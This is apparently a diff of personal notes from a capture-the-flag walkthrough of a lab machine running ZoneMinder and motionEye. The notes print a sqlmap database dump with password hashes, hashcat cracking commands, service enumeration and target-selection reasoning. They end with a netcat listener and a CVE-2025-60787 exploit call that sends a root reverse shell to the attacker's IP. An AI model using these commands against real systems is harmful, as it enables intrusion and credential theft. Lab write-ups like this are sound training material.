@@ -68,17 +68,243 @@ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=remove
 --cookie="ZMSESSID=79e4v7guebkneps7l6uq34e43j" \
 --dbms=mysql --batch -D zm -T Users -C "Username,Password" --dump
 
+Username   | Password                                                     |
++------------+--------------------------------------------------------------+
+| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
+| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
+| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m 
 
-    
+now this is bcrypt 
+
+saving this to a file 
+using hashcat 
+sudo hashcat pass.txt - /usr/share/wordlists/rockyou.txt  used this
+-error 
+-the mode need to be specifoed 
+If your hash starts with...,It is likely...,Use Mode (-m)
+$2y$ or $2a$,Bcrypt (Blowfish),3200
+$P$ or $H$,Phpass / WordPress,400
+$1$,MD5 (Unix),500
+No special characters (32 hex chars),Plain MD5,0
+"* (e.g., *0945...)",Old MySQL Password,300
+
+sudo hashcat -m [MODE_NUMBER] pass.txt /usr/share/wordlists/rockyou.txt
+
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz (incase rockyou.txt is not unzipped)
+
+got marks password -opensesame
+trying to ssh into it 
+--got in 
+typed in ls -nothing
+typed in ls-la (shows even hidden files)
+total 36
+drwxr-x--- 5 mark mark 4096 Mar  2 09:49 .
+drwxr-xr-x 4 root root 4096 Mar  2 09:49 ..
+lrwxrwxrwx 1 root root    9 Feb 13 10:01 .bash_history -> /dev/null
+-rw-r--r-- 1 mark mark  220 Mar 31  2024 .bash_logout
+-rw-r--r-- 1 mark mark 3771 Mar 31  2024 .bashrc
+drwx------ 2 mark mark 4096 Mar  2 09:49 .cache
+drwx------ 3 mark mark 4096 Mar  2 09:49 .gnupg
+-rw-r--r-- 1 mark mark  807 Mar 31  2024 .profile
+drwx------ 2 mark mark 4096 Mar  2 09:49 .ssh
+-rw-rw-r-- 1 mark mark  165 Sep 14  2025 .wget-hsts
+ no idea what any fo this means 
+
+
+now have to see what all services are running
+command for that is 
+systemctl list-units --type=service --state=running
+
+🔹 systemctl
+Command used to interact with systemd
+systemd = the system manager that controls services in Linux
+👉 Think:
+“Tool to control and inspect services”
+🔹 list-units
+Tells systemctl to list units
+❓ What is a “unit”?
+A unit is any object managed by systemd:
+service
+socket
+mount
+timer
+👉 So this means:
+“Show me all systemd-managed things”
+🔹 --type=service
+Filters the output
+👉 Only show:
+services (not sockets, mounts, etc.)
+So now:
+“Show me only services”
+🔹 --state=running
+Another filter
+👉 Only show services that are:
+currently running (active)
+So now:
+“Show me only services that are currently running”
+
+output -
+ UNIT                        LOAD   ACTIVE SUB     DESCRIPTION                                                 
+  apache2.service             loaded active running The Apache HTTP Server
+  auditd.service              loaded active running Security Auditing Service
+  containerd.service          loaded active running containerd container runtime
+  cron.service                loaded active running Regular background program processing daemon
+  dbus.service                loaded active running D-Bus System Message Bus
+  docker.service              loaded active running Docker Application Container Engine
+  fail2ban.service            loaded active running Fail2Ban Service
+  fwupd.service               loaded active running Firmware update daemon
+  getty@tty1.service          loaded active running Getty on tty1
+  ModemManager.service        loaded active running Modem Manager
+  motioneye.service           loaded active running motionEye Server
+  mysql.service               loaded active running MySQL Community Server
+  networkd-dispatcher.service loaded active running Dispatcher daemon for systemd-networkd
+  open-vm-tools.service       loaded active running Service for virtual machines hosted on VMware
+  polkit.service              loaded active running Authorization Manager
+  rsyslog.service             loaded active running System Logging Service
+  snapd.service               loaded active running Snap Daemon
+  ssh.service                 loaded active running OpenBSD Secure Shell server
+  sshguard.service            loaded active running SSHGuard
+  systemd-journald.service    loaded active running Journal Service
+  systemd-logind.service      loaded active running User Login Management
+  systemd-resolved.service    loaded active running Network Name Resolution
+  systemd-timesyncd.service   loaded active running Network Time Synchronization
+  systemd-udevd.service       loaded active running Rule-based Manager for Device Events and Files
+  udisks2.service             loaded active running Disk Manager
+  upower.service              loaded active running Daemon for power management
+  user@1000.service           loaded active running User Manager for UID 1000
+  vgauth.service              loaded active running Authentication service for virtual machines hosted on VMware
+  zoneminder.service          loaded active running ZoneMinder CCTV recording and surveillance system
+
+now why choose motioneye.service?
+ Step 1: Categorize the services
+From your list, mentally split them:
+🟢 Normal OS services (low value)
+cron, dbus, systemd-*, rsyslog, polkit
+👉 Core system stuff → usually not your first target
+🟡 Security / protection services
+fail2ban, sshguard
+👉 These actually protect the system
+Not attack targets (unless bypassing them)
+🔵 Infrastructure / background
+networkd, udisks2, upower, fwupd
+👉 Mostly irrelevant for initial access
+🟠 High-value targets (IMPORTANT 🚨)
+These are what you care about:
+ssh → remote access
+mysql → database
+docker / containerd → possible escape
+zoneminder → web app
+motioneye → web app
+🎯 Step 2: Why motioneye stands out
+🔥 1. It’s a WEB APPLICATION
+motioneye.service → CCTV web interface
+👉 Web apps = #1 attack surface
+SQLi
+XSS
+Auth bypass
+File upload
+
+🔥 2. It’s NOT a core system service
+Compare:
+cron → hardened, standard
+motioneye → third-party app
+👉 Third-party = more bugs, more CVEs
+🔥 3. Likely exposed on HTTP (port 80)
+You already saw:
+Port 80 open
+👉 That strongly suggests:
+motioneye / zoneminder is accessible via browser
+🔥 4. Known vulnerabilities
+You already found:
+ZoneMinder → SQL Injection CVE
+👉 That’s exactly why it was chosen
+🔥 5. Custom / uncommon service
+Anything that looks like:
+Not default Linux
+Not systemd core
+👉 = investigate immediately
+🧠 The Real Decision Logic (THIS IS GOLD)
+When you see services, ask:
+1. Is it exposed to me?
+Web app → YES ✅
+2. Is it complex?
+More code = more bugs
+3. Is it third-party?
+More likely vulnerable
+4. Does it handle input?
+Login forms, APIs → exploitable
 
 
 
+🎯 Final Answer
+You choose motioneye (and zoneminder) because:
+✅ It’s a web-facing application
+✅ It’s third-party (less secure)
+✅ It handles user input
+✅ It likely has known vulnerabilities
+✅ It matches open ports (port 80)
 
 
+⚡ One-Line Rule
+
+Always go for web apps first unless something else is obviously exposed
 
 
+cat /etc/systemd/system/motioneye.service 
+[Unit]
+Description=motionEye Server
+After=network.target local-fs.target remote-fs.target
+
+[Service]
+User=root
+RuntimeDirectory=motioneye
+LogsDirectory=motioneye
+StateDirectory=motioneye
+ExecStart=/usr/local/bin/meyectl startserver -c /etc/motioneye/motioneye.conf
+Restart=on-abort
+
+[Install]
+WantedBy=multi-user.target
+ it runs as root ---that is it has root prev important 
+
+cat /etc/motioneye/motion.conf
+this command as in the prev comman dwe see that it runs from here .
+output mark@cctv:~$ cat /etc/motioneye/motion.conf
+# @admin_username admin
+# @normal_username user
+# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
+# @lang en
+# @enabled on
+# @normal_password 
 
 
+setup_mode off
+webcontrol_port 7999
+webcontrol_interface 1
+webcontrol_localhost on
+webcontrol_parms 2
+
+camera camera-1.conf
+
+I noticed that the motionEye web interface was configured to listen only on the local interface (127.0.0.1), meaning I couldn't access it directly from my Kali browser.
+
+The Strategy: I used SSH Local Port Forwarding to create an encrypted tunnel.
+
+The Action: From my Kali machine, I ran a command to map my local port 8765 to the server's internal port 8765.
+ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
+
+The Result: This allowed me to "teleport" my browser traffic through SSH. I opened http://127.0.0.1:8765 on my Kali machine and was greeted by the motionEye login page, where I logged in as admin.
+
+4. Privilege Escalation: Getting Root (CVE-2025-60787)
+Once inside the motionEye admin panel, I looked for a way to execute system commands. I used a Python exploit script for CVE-2025-60787, which takes advantage of a command injection vulnerability in the service.
+
+The Setup: I opened a new terminal and set up a Netcat listener to catch the incoming connection.
+nc -lvnp 4444
+
+The Exploit: I executed the Python script, pointing it at my tunnelled web interface and providing the admin credentials I had cracked. I included my VPN IP so the server knew where to send the shell.
+python3 CVE-2025-60787.py revshell --url 'http://127.0.0.1:8765' --user 'admin' --password '[PASS]' -i 10.10.14.56 --port 4444
+
+The Final Move: Because the motionEye service was running with root privileges, the reverse shell it sent back to my Netcat listener gave me full root access.
 
 
 HYPERTEXT PROTOCOL (HTTP,PORT 80)
